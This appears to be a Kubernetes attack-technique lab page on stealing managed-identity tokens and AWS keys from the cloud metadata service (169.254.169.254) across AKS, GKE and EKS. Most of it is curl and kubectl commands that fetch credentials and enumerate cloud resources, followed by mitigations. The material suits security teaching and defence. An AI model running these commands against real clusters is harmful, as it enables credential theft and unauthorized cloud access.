# Accessing Managed Identity Credentials

An attacker with code execution inside any pod on a cloud-managed Kubernetes cluster can query the Instance Metadata Service (IMDS) to obtain a managed identity access token, then use that token to call cloud provider APIs without any credentials stored in the pod.

> **Note:** This technique requires a cloud-managed Kubernetes cluster and cannot be fully demonstrated on a local Kind cluster.

## Description

Managed identities are identities that are managed by the cloud provider and can be allocated to cloud resources, such as virtual machines. Those identities are used to authenticate with cloud services. The identity's secret is fully managed by the cloud provider, which eliminates the need to manage credentials. Applications obtain the identity's token by accessing the Instance Metadata Service (IMDS).

Attackers who gain access to a Kubernetes pod can leverage their access to the IMDS endpoint to get the managed identity's token. With that token, attackers can access cloud resources with the permissions granted to the node's managed identity — often broader than intended.

The IMDS endpoint is accessible from within any pod on the node without authentication. It is reachable at a link-local address that is the same across all three major cloud providers:

| Provider | IMDS Address | Token Path |
|----------|-------------|------------|
| Azure    | `http://169.254.169.254` | `/metadata/identity/oauth2/token` |
| GCP      | `http://metadata.google.internal` | `/computeMetadata/v1/instance/service-accounts/default/token` |
| AWS      | `http://169.254.169.254` | `/latest/meta-data/iam/security-credentials/<role-name>` |

## Prerequisites

- An AKS, GKE, or EKS cluster with a managed identity or IAM role assigned to the node pool.
- `kubectl` configured to connect to the cluster.
- A pod with `curl` or `wget` available (or an image that includes them).

## Conceptual Walkthrough

### Step 1 - Get a shell inside any pod

```bash
kubectl exec -it <pod-name> -- /bin/sh
```

Or deploy a minimal attacker pod:

```bash
kubectl run attacker --image=alpine:3.19 --restart=Never -- sleep 3600
kubectl exec -it pod/attacker -- /bin/sh
```

Install curl if not present:

```bash
apk add --no-cache curl
```

### Step 2 - Query the IMDS endpoint (Azure AKS)

Request a token for the Azure Resource Manager audience:

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Expected output:

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6...",
  "client_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "expires_in": "86399",
  "expires_on": "1710000000",
  "ext_expires_in": "86399",
  "not_before": "1709913600",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

Extract the token:

```bash
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)

echo $TOKEN
```

### Step 3 - Use the token to enumerate Azure resources

Identify the subscription from the IMDS:

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | grep -E '"subscriptionId"|"resourceGroupName"|"name"'
```

Use the token to call the Azure Resource Manager API:

```bash
SUBSCRIPTION_ID="<subscription-id-from-imds>"

# List resource groups
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups?api-version=2021-04-01" \
  | grep '"name"'

# List all resources in the cluster resource group
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/MC_myGroup_myCluster_eastus/resources?api-version=2021-04-01"
```

### Step 4 - Query the IMDS endpoint (GCP GKE)

```bash
# Retrieve service account email
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Retrieve the access token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Expected output:

```json
{
  "access_token": "ya29.c.b0AXv0zToBc...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

Use the GCP token to call Google APIs:

```bash
GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)

# List GCS buckets
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=<project-id>"

# List GCP project IAM policy
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project-id>:getIamPolicy" \
  -X POST -H "Content-Type: application/json" -d '{}'
```

### Step 5 - Query the IMDS endpoint (AWS EKS)

On EKS with IRSA (IAM Roles for Service Accounts), the credential delivery differs — tokens are projected into the pod rather than delivered via IMDS. However, the node's instance profile is still accessible:

```bash
# Get the IAM role name attached to the node instance profile
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve temporary credentials for that role
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

Expected output:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-01T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoXnyc4lcK4w...",
  "Expiration": "2024-01-01T06:00:00Z"
}
```

Use the credentials with the AWS CLI:

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="AQoXnyc4lcK4w..."

aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

### Step 6 - Decode and inspect the token

The access token is a JWT. Inspect its claims to understand what permissions it carries:

```bash
# Decode the JWT payload (works for Azure and GCP tokens)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || \
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
```

Look for `roles`, `scp` (scope), and `oid` fields that indicate what the identity can do.

## Mitigation

- **Restrict IMDS access** at the network level using `NetworkPolicy` to block pod-level access to `169.254.169.254`.
- On AKS, use **Workload Identity** instead of node-level Managed Identity to give each workload a distinct, least-privileged identity.
- On GKE, enable **Workload Identity** and disable the Compute Engine default service account on nodes.
- On EKS, use **IRSA** (IAM Roles for Service Accounts) with `--block-instance-metadata` on node groups to prevent access to node-level credentials.
- Apply the **principle of least privilege** to all managed identities and IAM roles — avoid attaching broad roles like Owner, Contributor, or AdministratorAccess to node pools.

## Resources

- [Azure Managed Identities](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview)
- [Azure Workload Identity for AKS](https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview)
- [GCP Managed Identities](https://cloud.google.com/iam/docs/managed-identities)
- [GCP Workload Identity Federation](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [AWS IAM Roles for Service Accounts](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- [MITRE ATT&CK - Unsecured Credentials: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)
